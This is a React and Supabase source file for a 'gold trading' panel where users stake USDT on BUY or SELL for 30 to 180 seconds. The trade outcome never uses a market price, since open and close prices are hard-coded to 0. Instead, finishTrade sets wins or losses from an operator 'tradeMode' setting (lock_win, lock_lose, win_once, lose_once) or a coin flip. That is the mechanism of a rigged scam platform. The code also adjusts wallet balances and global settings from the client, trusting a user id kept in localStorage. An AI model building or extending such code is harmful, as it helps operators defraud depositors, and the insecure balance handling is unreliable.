import { useEffect, useState } from "react";
import { supabase } from "../lib/supabase";
import { useToast } from "../context/ToastContext";
import "./TradeReceipt.css";


const RULES = {
  30: {
    min: 10,
    max: 999,
    profit: 5,
  },

  60: {
    min: 1000,
    max: 29999,
    profit: 10,
  },

  90: {
    min: 30000,
    max: 49999,
    profit: 12,
  },

  120: {
    min: 50000,
    max: 99999,
    profit: 15,
  },

  180: {
    min: 100000,
    max: 1000000,
    profit: 18,
  },
};

export default function TradePanel() {

    

  const { showToast } = useToast();  

  const [duration, setDuration] = useState(30);
  const [amount, setAmount] = useState(100);
  const [side, setSide] = useState(null);

  const [isTrading, setIsTrading] = useState(false);
  const [seconds, setSeconds] = useState(0);
  const [tradeId, setTradeId] = useState(null);
  const [receipt, setReceipt] = useState(null);
  const [currentTrade, setCurrentTrade] = useState(null);


  useEffect(() => {
  console.log("Receipt =", receipt);
  }, [receipt]);


  const [walletBalance, setWalletBalance] = useState(0);
  const [tradeAmount, setTradeAmount] = useState(0);

  const rule = RULES[duration];

  useEffect(() => {
  resumeTrade();
}, []);

  useEffect(() => {
  if (!isTrading) return;

  if (seconds <= 0) {
    finishTrade(currentTrade);
    return;
  }

  const timer = setTimeout(() => {
    setSeconds((s) => s - 1);
  }, 1000);

  return () => clearTimeout(timer);
}, [seconds, isTrading, currentTrade]);


  async function resumeTrade() {
  const user = JSON.parse(localStorage.getItem("user"));

  if (!user) return;

  const { data: trade } = await supabase
    .from("trades")
    .select("*")
    .eq("user_id", user.id)
    .eq("status", "trading")
    .order("id", { ascending: false })
    .limit(1)
    .single();

  if (!trade) return;

  const remain = Math.floor(
    (new Date(trade.end_at) - new Date()) / 1000
  );

  if (remain <= 0) {

  setTradeId(trade.id);
  setCurrentTrade(trade);
  setSide(trade.side);
  setTradeAmount(trade.amount);
  setDuration(trade.duration);

  const { data: wallet } = await supabase
    .from("wallets")
    .select("*")
    .eq("user_id", trade.user_id)
    .single();

  setWalletBalance(wallet.balance);

  await finishTrade(trade);

  return;
}

  const { data: wallet } = await supabase
    .from("wallets")
    .select("*")
    .eq("user_id", user.id)
    .single();

  setWalletBalance(wallet.balance);

  setTradeId(trade.id);
setCurrentTrade(trade);   // เพิ่มบรรทัดนี้
setSide(trade.side);
setTradeAmount(trade.amount);
setDuration(trade.duration);

  setSeconds(remain);

  setIsTrading(true);

  showToast("กลับเข้าสู่รายการเทรด", "success");
}


  async function startTrade(type) {

    if (amount < rule.min || amount > rule.max) {

  showToast(
  `Amount ${rule.min.toLocaleString()} - ${rule.max.toLocaleString()} USDT`,
  "warning"
);

  return;
}

    const user = JSON.parse(
      localStorage.getItem("user")
    );

    console.log("USER =", user);
    console.log("TYPE =", typeof user.id);
    console.log("ID =", user.id);


    if (!user) {

      showToast(
  "กรุณาเข้าสู่ระบบ",
  "warning"
);

      return;

    }


    const { data: openedTrade } = await supabase
  .from("trades")
  .select("id")
  .eq("user_id", user.id)
  .eq("status", "trading")
  .maybeSingle();

if (openedTrade) {
  showToast("คุณมีรายการเทรดที่ยังไม่เสร็จ", "warning");

  resumeTrade();

  return;
}


    // ดึง Wallet
const { data: wallet, error: walletError } = await supabase
  .from("wallets")
  .select("*")
  .eq("user_id", user.id)
  .single();

if (walletError) {

  showToast(walletError.message, "error");

  return;
}

// เงินไม่พอ
if (wallet.balance < amount) {

  showToast(
    "ยอดเงินไม่เพียงพอ",
    "warning"
  );

  return;
}

// หักเงิน
const { error: updateWalletError } = await supabase
  .from("wallets")
  .update({
    balance: wallet.balance - amount
  })
  .eq("user_id", user.id);

if (updateWalletError) {

  showToast(
    updateWalletError.message,
    "error"
  );

  return;
}

setWalletBalance(wallet.balance);
setTradeAmount(amount);

    


    const now = new Date();

const end = new Date(
  now.getTime() + duration * 1000
);

const {
  data: trade,
  error
} = await supabase
  .from("trades")
  .insert({
    user_id: user.id,
    coin: "XAUUSD",
    side: type,
    amount,
    duration,
    profit: rule.profit,
    status: "trading",

    open_price: 0,

    started_at: now.toISOString(),
    end_at: end.toISOString(),
  })
  .select()
  .single();
        

    if (error) {

  // คืนเงินกลับ Wallet
  await supabase
    .from("wallets")
    .update({
      balance: wallet.balance
    })
    .eq("user_id", user.id);

  showToast(
    error.message,
    "error"
  );

  return;

}

    setSide(type);
setTradeId(trade.id);
setCurrentTrade(trade);
setTradeAmount(trade.amount);
setDuration(trade.duration);

setSeconds(duration);

setIsTrading(true);

showToast(
  `${type} ${amount.toLocaleString()} USDT • ${duration} Seconds`,
  "success"
);
  }

async function finishTrade(trade = currentTrade) {

  setIsTrading(false);

  console.log("FINISH TRADE START");

  if (!trade) return;

const { data: latestTrade } = await supabase
  .from("trades")
  .select("status")
  .eq("id", trade.id)
  .single();

if (!latestTrade) return;

if (latestTrade.status === "finished") {
  return;
}

  const user = JSON.parse(localStorage.getItem("user"));

  // เปลี่ยนเป็น "win" เพื่อทดสอบ

 const {
  data: setting,
  error: settingError,
} = await supabase
  .from("settings")
  .select("value")
  .eq("key", "tradeMode")
  .single();

if (settingError) {
  showToast(settingError.message, "error");
  return;
}

const tradeMode = setting.value;

console.log("Trade Mode =", tradeMode);

let result;

switch (tradeMode) {
  case "lock_win":
    result = "win";
    break;

  case "lock_lose":
    result = "lose";
    break;

  case "win_once":
    result = "win";

    await supabase
      .from("settings")
      .update({ value: "auto" })
      .eq("key", "tradeMode");

    break;

  case "lose_once":
    result = "lose";

    await supabase
      .from("settings")
      .update({ value: "auto" })
      .eq("key", "tradeMode");

    break;

  default:
    result = Math.random() < 0.5 ? "win" : "lose";
}




console.log("Trade Mode =", tradeMode);
console.log("Result =", result);


  let payout = 0;
  let profitAmount = 0;

  if (result === "win") {

  const tradeRule = RULES[trade.duration];

  profitAmount =
    (trade.amount * tradeRule.profit) / 100;

  payout =
    trade.amount + profitAmount;

    const { data: wallet } = await supabase
  .from("wallets")
  .select("*")
 .eq("user_id", trade.user_id)
  .single();

await supabase
  .from("wallets")
  .update({
    balance: wallet.balance + payout,
  })
 .eq("user_id", trade.user_id);
  }

  const { error } = await supabase
  .from("trades")
  .update({

    status: "finished",

    result: result,

    payout: payout,

    profit_amount: profitAmount,

    finished_at: new Date().toISOString(),

    close_price: 0,

  })
  .eq("id", trade.id);



  if (error) {
    showToast(error.message, "error");
    return;
  }

  console.log("กำลังสร้างใบเสร็จ");

setReceipt({
  id: trade.id,
 amount: trade.amount,
duration: trade.duration,
side: trade.side,
  result,
  payout,
  time: new Date().toLocaleString(),
});

console.log("สร้างใบเสร็จแล้ว");

setCurrentTrade(null);
setTradeId(null);
setSeconds(0);


  if (result === "win") {

    showToast(
  `ชนะ +${payout.toLocaleString()} USDT`,
  "success"
);

  } else {

    showToast(
      "คุณแพ้",
      "error"
    );

  }
}

const min = String(
  Math.floor(seconds / 60)
).padStart(2, "0");

  const sec = String(
    seconds % 60
  ).padStart(2, "0");

  return (

    <div className="trade-panel">

      <div className="trade-buttons">

        <button
          className="buy-btn"
          disabled={isTrading}
          onClick={() => startTrade("BUY")}
        >
          BUY
        </button>

        <button
          className="sell-btn"
          disabled={isTrading}
          onClick={() => startTrade("SELL")}
        >
          SELL
        </button>

      </div>

      <div>

        <label>Trade Time</label>

        <select
          value={duration}
          disabled={isTrading}
          onChange={(e) =>
            setDuration(
              Number(e.target.value)
            )
          }
        >

          <option value={30}>30 Seconds (5%)</option>
          <option value={60}>60 Seconds (10%)</option>
          <option value={90}>90 Seconds (12%)</option>
          <option value={120}>120 Seconds (15%)</option>
          <option value={180}>180 Seconds (18%)</option>

        </select>

      </div>

      <div className="trade-info">

  <div>
    Amount :
    {rule.min.toLocaleString()} -
    {rule.max.toLocaleString()} USDT
  </div>

  <div>
    Profit :
    {rule.profit}%
  </div>

</div>

      <div>

        <label>Amount (USDT)</label>

        <input
          type="number"
          value={amount}
          disabled={isTrading}
          onChange={(e) =>
            setAmount(
              Number(e.target.value)
            )
          }
        />

      </div>

      {isTrading && (

        <>

          <div className="countdown">

            {min}:{sec}

          </div>

          <div className="trade-info">

            Status : Trading...

            <br />

            Type : {side}

          </div>

        </>

      )}

      {receipt && (
  <div className="trade-receipt">

    <h3>Trade Receipt</h3>

<p><strong>Order :</strong> #{receipt.id}</p>
<p><strong>Type :</strong> {receipt.side}</p>
<p><strong>Amount :</strong> {receipt.amount.toLocaleString()} USDT</p>
<p><strong>Duration :</strong> {receipt.duration} Seconds</p>
<p><strong>Result :</strong> {receipt.result.toUpperCase()}</p>
<p><strong>Payout :</strong> {receipt.payout.toLocaleString()} USDT</p>
<p><strong>Time :</strong> {receipt.time}</p>

    <button
  onClick={() => {
    setReceipt(null);
    setCurrentTrade(null);
    setTradeId(null);
    setIsTrading(false);
    setSeconds(0);
  }}
>
  Close
</button>

  </div>
)}

    </div>

  );

}